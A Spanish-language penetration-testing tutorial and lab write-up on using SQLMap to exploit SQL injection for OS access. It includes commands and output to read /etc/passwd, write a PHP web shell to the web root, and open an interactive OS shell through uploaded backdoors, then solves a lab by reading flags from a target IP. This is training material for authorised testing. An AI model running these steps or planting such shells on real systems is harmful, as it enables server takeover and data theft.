
# SQLMap - Explotación de S.O.

SQLMap tiene la capacidad de utilizar una inyección SQL para leer y escribir archivos desde el sistema local fuera del DBMS. SQLMap también puede intentar brindarnos la ejecución directa de comandos en el host remoto si tuviéramos los privilegios adecuados.

***

## <mark style="color:purple;">Lectura/escritura de archivos</mark>

La primera parte de la explotación del sistema operativo a través de una vulnerabilidad de inyección SQL es la lectura y escritura de datos en el servidor de alojamiento. La lectura de datos es mucho más común que la escritura de datos, que es estrictamente privilegiada en los DBMS modernos, ya que puede conducir a la explotación del sistema, como veremos. Por ejemplo, en MySql, para leer archivos locales, el usuario de la base de datos debe tener el privilegio `LOAD DATA` y `INSERT` para poder cargar el contenido de un archivo en una tabla y luego leer esa tabla.

* `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

Si bien no necesariamente necesitamos tener privilegios de administrador de base de datos (`DBA`) para leer datos, esto se está volviendo más común en los DBMS modernos. Lo mismo se aplica a otras bases de datos comunes. Aun así, si tenemos privilegios de DBA, entonces es mucho más probable que tengamos privilegios de lectura de archivos.

***

## <mark style="color:purple;">Comprobación de privilegios de DBA</mark>

Para comprobar si tenemos privilegios de DBA con SQLMap, podemos utilizar la opción `--is-dba`:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:31:55 /2020-11-19/

[17:31:55] [INFO] resuming back-end DBMS 'mysql'
[17:31:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: False

[*] ending @ 17:31:56 /2020-11-19
```

Como podemos ver, si probamos eso en uno de los ejercicios anteriores, obtenemos `current user is DBA: False`, lo que significa que no tenemos acceso de DBA. Si intentáramos leer un archivo usando SQLMap, obtendríamos algo como:

```shell-session
[17:31:43] [INFO] fetching file: '/etc/passwd'
[17:31:43] [ERROR] no data retrieved
```

Para probar la explotación del sistema operativo, intentemos un ejercicio en el que tenemos privilegios de DBA, como se ve en las preguntas al final de esta sección:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --is-dba

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.11#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:37:47 /2020-11-19/

[17:37:47] [INFO] resuming back-end DBMS 'mysql'
[17:37:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: True

[*] ending @ 17:37:48 /2020-11-19/
```

Vemos que esta vez obtenemos `current user is DBA: True`, lo que significa que podemos tener el privilegio de leer archivos locales.

***

## <mark style="color:purple;">Lectura de archivos locales</mark>

En lugar de inyectar manualmente la línea anterior a través de SQLi, SQLMap hace que sea relativamente fácil leer archivos locales con la opción `--file-read`:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:40:00 /2020-11-19/

[17:40:00] [INFO] resuming back-end DBMS 'mysql'
[17:40:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[17:40:01] [INFO] fetching file: '/etc/passwd'
[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
[17:40:07] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y

[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
files saved to [1]:
[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)

[*] ending @ 17:40:14 /2020-11-19/
```

Como podemos ver, SQLMap `guardó los archivos` a un archivo local. Podemos acceder al archivo local para ver su contenido con `cat`:

```shell-session
afsh4ck@kali$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

Hemos recuperado con éxito el archivo remoto.

***

## <mark style="color:purple;">Escritura de archivos locales</mark>

Cuando se trata de escribir archivos en el servidor de alojamiento, se vuelve mucho más restringido en los DMBS modernos, ya que podemos utilizar esto para escribir un Web Shell en el servidor remoto y, por lo tanto, obtener la ejecución del código y tomar el control del servidor.

Por este motivo, los sistemas de gestión de bases de datos modernos desactivan la escritura de archivos de forma predeterminada y requieren ciertos privilegios para que los administradores de bases de datos puedan escribir archivos. Por ejemplo, en MySQL, la configuración `--secure-file-priv` debe desactivarse manualmente para permitir la escritura de datos en archivos locales mediante la consulta SQL `INTO OUTFILE`, además de cualquier acceso local necesario en el servidor host, como el privilegio para escribir en el directorio que necesitamos.

Aun así, muchas aplicaciones web requieren que los DBMS puedan escribir datos en archivos, por lo que vale la pena probar si podemos escribir archivos en el servidor remoto. Para hacerlo con SQLMap, podemos usar las opciones `--file-write` y `--file-dest`. Primero, preparemos un shell web PHP básico y escribámoslo en un archivo `shell.php`:

```shell-session
afsh4ck@kali$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora, intentemos escribir este archivo en el servidor remoto, en el directorio raíz web predeterminado de Apache `/var/www/html/`. Si no conocemos el directorio raíz web del servidor, veremos cómo SQLMap puede encontrarlo automáticamente.

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:54:18 /2020-11-19/

[17:54:19] [INFO] resuming back-end DBMS 'mysql'
[17:54:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y

[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

[*] ending @ 17:54:28 /2020-11-19/
```

Vemos que SQLMap confirmó que efectivamente el archivo fue escrito:

```shell-session
[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
```

Ahora, podemos intentar acceder al shell PHP remoto y ejecutar un comando de muestra:

```shell-session
afsh4ck@kali$ curl http://www.example.com/shell.php?cmd=ls+-la

total 148
drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
```

Vemos que nuestro shell PHP efectivamente fue escrito en el servidor remoto y que tenemos ejecución de comandos en el servidor host.

***

## <mark style="color:purple;">Ejecución de comandos del sistema operativo</mark>

Ahora que hemos confirmado que podemos escribir un shell PHP para obtener la ejecución de comandos, podemos probar la capacidad de SQLMap para proporcionarnos un shell de SO sencillo sin tener que escribir manualmente un shell remoto. SQLMap utiliza varias técnicas para obtener un shell remoto a través de vulnerabilidades de inyección SQL, como escribir un shell remoto, como acabamos de hacer, escribir funciones SQL que ejecuten comandos y recuperen la salida o incluso utilizar algunas consultas SQL que ejecuten directamente comandos de SO, como `xp_cmdshell` en Microsoft SQL Server.&#x20;

Para obtener un shell de SO con SQLMap, podemos utilizar la opción `--os-shell`, de la siguiente manera:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --os-shell

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:02:15 /2020-11-19/

[18:02:16] [INFO] resuming back-end DBMS 'mysql'
[18:02:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output
```

Vemos que SQLMap utilizó de forma predeterminada la técnica `UNION` para obtener un shell del sistema operativo, pero finalmente no nos dio ningún resultado `No output`. Por lo tanto, como ya sabemos que tenemos varios tipos de vulnerabilidades de inyección SQL, intentemos especificar otra técnica que tenga más posibilidades de darnos un resultado directo, como `Error-based SQL Injection`, que podemos especificar con `--technique=E`:

```shell-session
afsh4ck@kali$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 18:05:59 /2020-11-19/

[18:05:59] [INFO] resuming back-end DBMS 'mysql'
[18:05:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y

[18:06:07] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[18:06:09] [WARNING] unable to automatically parse any web server path
[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la

do you want to retrieve the command standard output? [Y/n/a] a

command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
```

Como podemos ver, esta vez SQLMap nos llevó con éxito a un shell remoto interactivo fácil, lo que nos permite una fácil ejecución remota de código a través de este SQLi.

{% hint style="info" %}
**Nota**: SQLMap primero nos pidió el tipo de lenguaje utilizado en este servidor remoto, que sabemos que es PHP. Luego nos pidió el directorio raíz web del servidor y le pedimos a SQLMap que lo buscara automáticamente utilizando "ubicaciones comunes". Ambas opciones son las predeterminadas y se habrían elegido automáticamente si hubiéramos agregado la opción "`--batch`" a SQLMap.
{% endhint %}

Con esto, hemos cubierto toda la funcionalidad principal de SQLMap.

***

## Caso práctico

```
Objetivo: 94.237.59.199:49638
```

### Pregunta 1

Intente utilizar SQLMap para leer el archivo "`/var/www/html/flag.txt`".

<figure><img src="/files/5YI9isz3s92t2eg3vwLp" alt=""><figcaption></figcaption></figure>

#### 1. Comprobar si es DBA

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ sqlmap -u "http://94.237.59.199:49638/?id=1" --batch --is-dba 
</strong>        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:41:21 /2024-08-14/

[13:41:21] [INFO] testing connection to the target URL
[13:41:21] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:41:21] [INFO] testing if the target URL content is stable
[13:41:22] [INFO] target URL content is stable
[13:41:22] [INFO] testing if GET parameter 'id' is dynamic
[13:41:22] [INFO] GET parameter 'id' appears to be dynamic
[13:43:12] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
&#x3C;------SNIP------>
[13:43:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:43:12] [INFO] testing if current user is DBA
[13:43:12] [INFO] fetching current user
current user is DBA: True
</code></pre>

Nos da true, por lo que este usuario es administrador de la base de datos.

#### 2. Lectura del archivo:

```shell-session
afsh4ck@kali$ sqlmap -u "http://94.237.59.199:49638/?id=1" --batch --file-read "/var/www/html/flag.txt"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:46:23 /2024-08-14/

[13:46:23] [INFO] resuming back-end DBMS 'mysql' 
[13:46:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

[13:46:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:46:23] [INFO] fingerprinting the back-end DBMS operating system
[13:46:23] [INFO] the back-end DBMS operating system is Linux
[13:46:23] [INFO] fetching file: '/var/www/html/flag.txt'
do you want confirmation that the remote file '/var/www/html/flag.txt' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[13:46:23] [INFO] the local file '/home/kali/.local/share/sqlmap/output/94.237.59.199/files/_var_www_html_flag.txt' and the remote file '/var/www/html/flag.txt' have the same size (31 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/94.237.59.199/files/_var_www_html_flag.txt (same file)
```

```bash
cat /home/kali/.local/share/sqlmap/output/94.237.59.199/files/_var_www_html_flag.txt                       
HTB{5up3r_u53r5_4r3_p0w3rful}
```

### Pregunta 2

Utilice SQLMap para obtener un shell de sistema operativo interactivo en el host remoto e intente encontrar otra flag dentro del host.

```shell-session
afsh4ck@kali$ sqlmap -u "http://94.237.59.199:49638/?id=1" --batch --os-shell --technique=E
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:50:15 /2024-08-14/

[13:50:15] [INFO] resuming back-end DBMS 'mysql' 
[13:50:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

[13:50:16] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[13:50:17] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://94.237.59.199:49638/tmpuxhex.php
[13:50:17] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://94.237.59.199:49638/tmpbrwjj.php
[13:50:17] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
basic.php
common.inc.php
flag.txt
index.php
logo.png
robots.txt
template.php
tmpbrwjj.php
tmpuxhex.php
vendor
---
os-shell> cd /
do you want to retrieve the command standard output? [Y/n/a] Y
No output
os-shell> ls /
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
---
os-shell> cat /flag.txt
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'HTB{n3v3r_run_Db_45_db4}'
```

Encontramos otra flag en el directorio raiz `/` y conseguimos leer la flag sin problema 🏆
